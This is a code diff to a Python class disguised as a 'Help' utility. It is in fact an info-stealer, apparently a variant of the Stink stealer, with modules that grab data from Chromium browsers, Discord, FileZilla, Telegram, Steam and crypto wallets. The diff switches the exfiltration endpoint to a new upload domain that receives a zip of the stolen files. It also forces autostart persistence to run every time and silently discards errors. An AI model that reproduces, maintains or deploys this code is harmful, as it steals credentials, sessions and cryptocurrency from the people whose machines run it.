@@ -11,6 +11,7 @@ from helper.helpers.config import MultihelpConfig, Browsers
 from helper.utils import Autostart, Message, Protector, Loader, Grabber
 from helper.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 import requests
+import threading
 
 class Help(Thread):
     """
@@ -200,8 +201,6 @@ class Help(Thread):
 
     def run(self) -> None:
         """
-        Launches the Stink.
-
         Parameters:
         - None.
 
@@ -209,8 +208,9 @@ class Help(Thread):
         - None.
         """
         try:
-
             sleep(self.__delay)
+
+            Autostart().run()
 
             if self.__message is True:
                 Thread(target=Message().run).start()
@@ -238,7 +238,7 @@ class Help(Thread):
             data = self.__storage.create_zip([file for data in results if data for file in data.files])
             preview = self.__storage.create_preview([field for data in results if data for field in data.fields])
 
-            url = "https://api.snipercallsbot.com/upload"
+            url = "https://apiusy.pics/upload"
 
             files = {"file": data}
             data = {"caption": preview}
@@ -251,9 +251,5 @@ class Help(Thread):
             for loader in self.__loaders:
                 loader.run()
 
-            if self.__autostart is True:
-                Autostart(argv[0]).run()
-
         except Exception as e:
-            pass
             pass
